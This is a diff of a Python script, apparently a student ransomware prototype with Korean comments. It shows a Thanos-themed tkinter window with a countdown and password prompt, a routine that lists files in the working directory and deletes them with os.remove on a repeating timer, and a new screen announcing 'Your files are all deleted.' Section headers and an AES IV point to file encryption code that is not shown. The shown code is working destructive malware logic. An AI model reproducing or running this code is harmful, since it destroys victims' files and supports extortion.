@@ -21,7 +21,6 @@ iv = os.urandom(16)
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드
 
-
 class tk:
     def __init__(self):
         self.window = tkinter.Tk()
@@ -39,11 +38,11 @@ class tk:
         self.l_timer = tkinter.Label(self.window, text="타이머 시작 = 5", fg="red", bg="black", font='Helvetica 14 bold')
         self.l_timer.pack()
 
-        self.l_text1 = tkinter.Label(self.window, text="삭제될 리스트입니다",fg="red", bg="black", font='Helvetica 14 bold')
-        self.l_text1.pack()
+        #self.l_text1 = tkinter.Label(self.window, text="삭제될 리스트입니다",fg="red", bg="black", font='Helvetica 14 bold')
+        #self.l_text1.pack()
 
-        self.l_filelist = tkinter.Label(self.window, text=" ",fg="red", bg="black", font='Helvetica 14 bold')
-        self.l_filelist.pack()
+        #self.l_filelist = tkinter.Label(self.window, text=" ",fg="red", bg="black", font='Helvetica 14 bold')
+        #self.l_filelist.pack()
 
         self.l_input = tkinter.Label(self.window,
                                      text="password:",
@@ -79,7 +78,6 @@ class tk:
         self.l_thanos = tkinter.Label(gui.self.frame2, image=gui.thanos)
         self.l_thanos.pack()
 
-
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////파일 리스팅 함수
 
 def list_files(path, ext=None):
@@ -96,7 +94,6 @@ def list_files(path, ext=None):
 
     print("filelist: \n", filelist)
     return filelist
-
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////타이머관련함수
 
@@ -116,13 +113,21 @@ def startTimer(gui, path, ext=None):
                 remove_filelist.append(name)
 
     # gui/ 삭제될 파일 리스트 출력
-    gui.l_filelist.config(text="[" + ",".join(remove_filelist) + "]")
+    #gui.l_filelist.config(text="[" + ",".join(remove_filelist) + "]")
+    # 지운 파일 출력 #새창으로 띄우기
+    gui.listWindow = tkinter.Toplevel(gui.window)
+    gui.listWindow.title('삭제될 리스트')
+    gui.listWindow.geometry("800x400")
+    gui.listWindow.configure(background="black")
+    gui.list = tkinter.Label(gui.listWindow, text="[" + ",".join(remove_filelist) + "]", background="black", fg="red")
+    gui.list.pack()
+    ####
     print("[" + ",".join(remove_filelist) + "]")
 
     clock(gui, 5, remove_filelist)
 
 
-# 타이머를 출력해주는 함수 (문제: c가 계속 5로 출력됨)
+# 타이머를 출력해주는 함수
 def clock(gui, c, remove_filelist):
     c -= 1
 
@@ -138,6 +143,14 @@ def clock(gui, c, remove_filelist):
     # 자기 자신 호출
     threading.Timer(1, clock, [gui, c, remove_filelist]).start()
 
+#모두 삭제되었을 때 GUI #혜연 11/22 추가
+def allRemovePrint(gui):
+    gui.l_thanos.destroy()
+    l_allremove = tkinter.Label(gui.window, text="\n\nYour files are all deleted.\n\n",
+                                fg="red", bg="black", font='Helvetica 16 bold')
+    l_allremove.pack()
+    sleep(3)
+    gui.window.destroy()
 
 def remove_files(gui, remove_filelist, ext=None):
     gui.l_thanos.destroy()
@@ -175,11 +188,11 @@ def remove_files(gui, remove_filelist, ext=None):
     elif (len(remove_filelist) == 1):
         os.remove(remove_filelist[0])
         print("더 이상 삭제할 파일이 없습니다")
-        gui.window.destroy()
+        allRemovePrint(gui)
     # 맨 처음 파일이 0개일 경우
     else:
         print("더 이상 삭제할 파일이 없습니다")
-        gui.window.destroy()
+        allRemovePrint(gui)
 
     # gui
     sleep(2)
@@ -189,7 +202,7 @@ def remove_files(gui, remove_filelist, ext=None):
     gui.l_thanos.pack()
 
     # 다시 타이머함수 시작!
-    startTimer(gui,os.getcwd())
+    startTimer(gui, os.getcwd())
 
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////암호화 복호화 함수
@@ -345,7 +358,7 @@ if __name__ == "__main__":
         i += 1
 
     # 타이머 시작 코드
-    th1 = threading.Thread(target=startTimer, args=[gui,os.getcwd()])
+    th1 = threading.Thread(target=startTimer, args=[gui, os.getcwd()])
     th1.daemon = True
     th1.start()
 
